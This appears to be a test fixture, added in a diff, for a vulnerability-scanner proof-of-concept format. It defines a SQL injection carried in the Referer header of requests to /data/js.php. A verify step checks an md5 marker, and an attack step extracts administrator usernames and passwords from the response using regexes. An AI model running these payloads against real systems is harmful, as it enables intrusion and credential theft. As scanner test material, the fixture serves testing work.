@@ -1,0 +1,51 @@
+{
+  "pocInfo": {
+    "vulID": "test-004",
+    "version": "1",
+    "name": "Result Extraction with Regex",
+    "protocol": "http",
+    "vulType": "SQL Injection",
+    "author": "TestAuthor"
+  },
+  "pocExecute": {
+    "verify": [
+      {
+        "step": "0",
+        "method": "GET",
+        "vulPath": "/data/js.php",
+        "params": "id=1",
+        "necessary": "",
+        "headers": {
+          "Referer": "1', (SELECT md5(1))#"
+        },
+        "status": "200",
+        "match": {
+          "regex": ["c4ca4238a0b923820dcc509a6f75849b"]
+        }
+      }
+    ],
+    "attack": [
+      {
+        "step": "0",
+        "method": "GET",
+        "vulPath": "/data/js.php",
+        "params": "id=1",
+        "necessary": "",
+        "headers": {
+          "Referer": "1', (SELECT concat(username,'---',password))#"
+        },
+        "status": "200",
+        "match": {
+          "regex": ["Duplicate"]
+        },
+        "result": {
+          "AdminInfo": {
+            "Username": "<regex>--(.+)---",
+            "Password": "<regex>---(.+)--"
+          }
+        }
+      }
+    ]
+  }
+}
+
